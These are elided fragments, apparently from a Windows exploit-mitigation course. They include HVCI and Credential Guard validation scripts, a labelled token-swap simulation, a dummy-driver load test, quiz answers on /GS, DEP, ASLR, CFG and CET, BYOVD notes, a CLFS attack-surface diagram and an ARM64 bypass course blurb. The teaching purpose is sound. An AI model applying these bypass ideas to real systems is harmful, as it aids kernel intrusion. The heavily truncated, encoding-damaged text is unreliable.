        if result == "BLOCKED_BY_HVCI":
            print("  [+] HVCI is ACTIVE â€” unsigned kernel code is blocked")
            ...
            print("  [-] Driver was allowed to load â€” HVCI may not be active")
        else:
...
#!/usr/bin/env python3
"""
token_attack_sim.py â€” Simulate kernel token swap attack and VBS protection
...
def main():
    print("=" * 60)
    print("  Kernel Token Swap Attack Simulation")
    print("  (Educational â€” does NOT perform actual kernel exploitation)")
    print("=" * 60)
...
#!/usr/bin/env python3
"""
cred_guard_verifier.py â€” Remotely verify Credential Guard enforcement
    ...
    checks = [
        ...
        },
        {
            ...
            "cmd": (
                ...
                "} else { 'Cannot access LSASS (good â€” it is protected)' }"
            ),
        },
        {
...
#!/usr/bin/env python3
"""
vbs_validation_suite.py â€” Complete VBS/HVCI mitigation validation
...
2. Enable HVCI via Windows Settings (Settings â†’ Privacy & Security â†’ Windows Security â†’ Device Security â†’ Core Isolation â†’ Memory Integrity)
...
```powershell
# Step 1: Create a dummy "driver" file (just garbage bytes â€” not a real driver)
...
sc start FakeDriver
# Without HVCI: Fails (not a valid PE) â€” but the LOADING attempt is allowed
# With HVCI:    Fails EARLIER â€” HVCI rejects unsigned code before parsing
...
# This is the BYOVD attack vector â€” HVCI checks integrity, not quality.
...
2. **HVCI is "code signing for the kernel"**: It prevents unsigned code execution but does
   ...
   work even with HVCI enabled â€” the same principle as Day 2's data-only technique.
...
5. **BYOVD (Bring Your Own Vulnerable Driver) bypasses HVCI**: Signed drivers with
   ...
   it's always reactive â€” new vulnerable signed drivers appear regularly.
...
5. **Why can't "Administrator" access VTL 1 (Secure World) memory?**
   ...
   > kernel cannot construct page tables that map VTL 1 memory â€” the hypervisor
   > intercepts and blocks such attempts at the hardware level.

6. **How does Pluton differ from a traditional TPM 2.0 chip?**

   > Traditional TPMs are discrete chips connected via LPC/SPI bus â€” an attacker
...
1. **Why is "Enforcement" (Blocking) better than "Audit" (Logging), but harder to implement?**
   ...
   > been blocked â€” the attack still succeeds. But enforcement risks breaking legitimate
...
2. **If you were a red teamer, which mitigation would annoy you the most?**
   ...
   > CET (shadow stacks) â€” because it's hardware-enforced with no known generic bypass.
   ...
   > overwrites (proven in Day 2). But CET has no "allowed" bypass case â€” you must
...
2. **\_\_fastfail() bypasses SEH entirely**: Both /GS and CFG use `__fastfail()` which
   executes `int 0x29` â€” trapping directly to the kernel. No `__try/__except` handler
...
4. **CFG coarse-grained limitation persists in testing**: The mitigation_demo's `evil_func`
   is a valid function entry point â€” CFG allows the call. Only calls to non-function
...
");
    ...
    // The pointer is NOT set to NULL â€” use-after-free is possible
}
...
2. **Default â‰  Secure**: Out-of-the-box Windows prioritizes compatibility. Many mitigations
...
1. **Which mitigation was the most effective against the Stack Overflow exploit?**
   ...
   > /GS (stack cookies) â€” because it detects the overflow BEFORE the attacker gets
...
3. **How does enabling ASLR affect the reliability of your exploits?**
   ...
   > Exploits using hardcoded addresses become unreliable â€” they work on one boot
...
4. **If you could only enable ONE mitigation, which would it be and why?**
   > DEP (/NXCOMPAT) â€” because it eliminates the simplest and most common exploit
...
â”‚       â”‚                                                      â”‚
â”‚       â–¼                                                      â”‚
â”‚  clfsw32.dll (User-mode CLFS library)                        â”‚
â”‚       â”‚                                                      â”‚
â”‚       â”‚ CreateLogFile(), ReadLogRecord(), WriteLogRecord()   â”‚
â”‚       â–¼                                                      â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â”‚
â”‚                                                              â”‚
â”‚  KERNEL MODE                                                 â”‚
â”‚  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                                 â”‚
â”‚  clfs.sys (Kernel driver)                                    â”‚
â”‚       â”‚                                                      â”‚
â”‚       â”œâ”€â”€ CClfsBaseFilePersisted (Base Log File)             â”‚
â”‚       â”œâ”€â”€ CClfsContainer (Container management)              â”‚
â”‚       â”œâ”€â”€ CClfsLogFcbPhysical (File Control Block)           â”‚
â”‚       â””â”€â”€ CLFS_LOG_BLOCK_HEADER (Log block parsing)          â”‚
â”‚                                                              â”‚
â”‚  Attack Surface:                                             â”‚
â”‚  â”œâ”€â”€ Log file parsing (most bugs here)                       â”‚
â”‚  â”œâ”€â”€ Container operations                                    â”‚
â”‚  â”œâ”€â”€ Metadata validation                                     â”‚
â”‚  â””â”€â”€ Reference counting (UAF bugs)                           â”‚
â”‚                                                              â”‚
â”‚  Log File Structure (.blf):                                  â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚
â”‚  â”‚ Control Record â”‚ Base Record â”‚ Containers â”‚ Clients  â”‚    â”‚
â”‚  â”‚    (metadata)  â”‚  (shadow)   â”‚  (data)    â”‚ (state)  â”‚    â”‚
...
- **ARM64 Exploitation â€” PAC, BTI & MTE Bypass**: Learn ARM64-specific exploitation including pointer authentication code signing bypasses, branch target identification circumvention, and memory tagging exploitation
